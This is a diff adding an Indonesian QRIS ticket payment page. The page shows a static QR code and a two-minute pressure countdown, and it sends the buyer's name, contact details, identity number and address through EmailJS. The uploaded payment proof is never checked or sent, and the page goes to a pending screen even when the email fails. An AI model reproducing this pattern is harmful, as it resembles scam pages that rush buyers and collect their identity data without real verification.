@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Final QRIS Payment</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Poppins,sans-serif}
+body{background:linear-gradient(135deg,#081225,#101b35);color:#fff;padding:20px}
+.wrap{max-width:800px;margin:auto}
+.card{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);backdrop-filter:blur(16px);border-radius:28px;padding:24px;margin-top:20px}
+.timer{font-size:44px;font-weight:800;text-align:center;color:#00e5ff}
+.timer.warning{color:#ff3b3b;animation:pulse .8s infinite}
+@keyframes pulse{50%{transform:scale(1.08)}}
+.alert{display:none;text-align:center;color:#ff6b6b;font-weight:700;margin-top:8px}
+.alert.show{display:block;animation:pulse .8s infinite}
+.info{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:20px 0}
+.item{background:rgba(255,255,255,.05);padding:14px;border-radius:16px}
+.label{font-size:12px;color:#b8c4d8}
+.value{font-weight:700;margin-top:6px}
+.qrbox{text-align:center;padding:18px;border-radius:24px;background:#fff}
+.qrbox img{max-width:100%;border-radius:16px}
+.total{font-size:34px;font-weight:800;color:#00e5ff;text-align:center;margin:15px 0}
+.copybtn,.btn{width:100%;padding:16px;border:none;border-radius:16px;font-weight:700;cursor:pointer}
+.copybtn{background:#243b63;color:#fff;margin-bottom:15px}
+.uploadbox{border:2px dashed rgba(255,255,255,.3);padding:30px;border-radius:22px;text-align:center;background:rgba(255,255,255,.04)}
+.uploadbox input{display:none}
+.uploadbox label{cursor:pointer;display:block}
+.preview{max-width:100%;display:none;border-radius:16px;margin-top:15px}
+.btn{background:linear-gradient(135deg,#00c8ff,#0099ff);color:#fff;margin-top:15px}
+#overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.92);justify-content:center;align-items:center;flex-direction:column;z-index:9999}
+.spin{width:80px;height:80px;border-radius:50%;border:6px solid rgba(255,255,255,.15);border-top:6px solid #00e5ff;animation:rot 1s linear infinite}
+@keyframes rot{100%{transform:rotate(360deg)}}
+#status{margin-top:20px}
+</style>
+</head>
+<body>
+<div class="wrap">
+<div class="card">
+<div class="timer" id="payTimer">02:00</div>
+<div class="alert" id="warn">⚠ SEGERA SELESAIKAN PEMBAYARAN</div>
+
+<div class="info">
+<div class="item"><div class="label">Nama Pemesan</div><div class="value" id="nama">-</div></div>
+<div class="item"><div class="label">Jumlah Tiket</div><div class="value" id="jumlah">0</div></div>
+<div class="item"><div class="label">Jenis Tiket</div><div class="value" id="jenis">-</div></div>
+<div class="item"><div class="label">Total Pembayaran</div><div class="value" id="totalInfo">Rp0</div></div>
+</div>
+
+<div class="qrbox">
+<img src="qris-pembayaran1.jpg" alt="QRIS">
+</div>
+
+<div class="total" id="total">Rp0</div>
+<button class="copybtn" onclick="copyNominal()">📋 Salin Nominal Pembayaran</button>
+
+<div class="uploadbox">
+<label for="bukti">📤 Upload Bukti Pembayaran<br><small>Klik untuk memilih gambar</small></label>
+<input type="file" id="bukti" accept="image/*">
+<img id="preview" class="preview">
+</div>
+
+<div style="margin-top:15px">
+<label><input type="checkbox" id="agree"> Saya telah melakukan pembayaran</label>
+</div>
+
+<button class="btn" onclick="verifikasi()">KONFIRMASI PEMBAYARAN</button>
+</div>
+</div>
+
+<div id="overlay">
+<div class="spin"></div>
+<div id="status">Pembayaran Sedang Diproses...</div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script>
+emailjs.init("qwh-PQ-0-G6lBjI4C");
+
+const nama=localStorage.getItem('nama')||'-';
+const jenis=localStorage.getItem('jenisTiket')||'-';
+const jumlah=localStorage.getItem('jumlahTiket')||'0';
+const total=localStorage.getItem('totalPembayaran')||'0';
+
+document.getElementById('nama').innerText=nama;
+document.getElementById('jenis').innerText=jenis;
+document.getElementById('jumlah').innerText=jumlah;
+document.getElementById('total').innerText='Rp'+Number(total).toLocaleString('id-ID');
+document.getElementById('totalInfo').innerText='Rp'+Number(total).toLocaleString('id-ID');
+
+let t=120;
+const timer=document.getElementById('payTimer');
+setInterval(()=>{
+ if(t>0){
+  t--;
+  let m=Math.floor(t/60),s=t%60;
+  timer.innerText=String(m).padStart(2,'0')+':'+String(s).padStart(2,'0');
+  if(t<=10){
+    timer.classList.add('warning');
+    document.getElementById('warn').classList.add('show');
+  }
+ }
+},1000);
+
+document.getElementById('bukti').onchange=e=>{
+ const f=e.target.files[0];
+ if(!f)return;
+ const preview=document.getElementById('preview');
+ preview.src=URL.createObjectURL(f);
+ preview.style.display='block';
+}
+
+function copyNominal(){
+ navigator.clipboard.writeText(total);
+ alert('Nominal berhasil disalin');
+}
+
+function verifikasi(){
+ const agree=document.getElementById('agree');
+ const bukti=document.getElementById('bukti');
+ const overlay=document.getElementById('overlay');
+
+ if(!agree.checked){alert('Centang konfirmasi pembayaran');return;}
+ if(!bukti.files.length){alert('Upload bukti pembayaran');return;}
+
+ overlay.style.display='flex';
+
+ const dataEmail={
+  nama:nama,
+  email:localStorage.getItem('email')||'',
+  wa:localStorage.getItem('wa')||'',
+  identitas:localStorage.getItem('identitas')||'',
+  nomorIdentitas:localStorage.getItem('nomorIdentitas')||'',
+  alamat:localStorage.getItem('alamat')||'',
+  jenis_tiket:jenis,
+  jumlah_tiket:jumlah,
+  totalPembayaran:total,
+  metode_pembayaran:'QRIS',
+  tanggal_transaksi:new Date().toLocaleString('id-ID')
+ };
+
+ emailjs.send('service_mp5tixd','template_sifrpxs',dataEmail)
+ .then(()=>{
+   setTimeout(()=>{
+      window.location.href='pending.html';
+   },5000);
+ })
+ .catch((err)=>{
+   console.log(err);
+   setTimeout(()=>{
+      window.location.href='pending.html';
+   },1500);
+ });
+}
+</script>
+</body>
+</html>
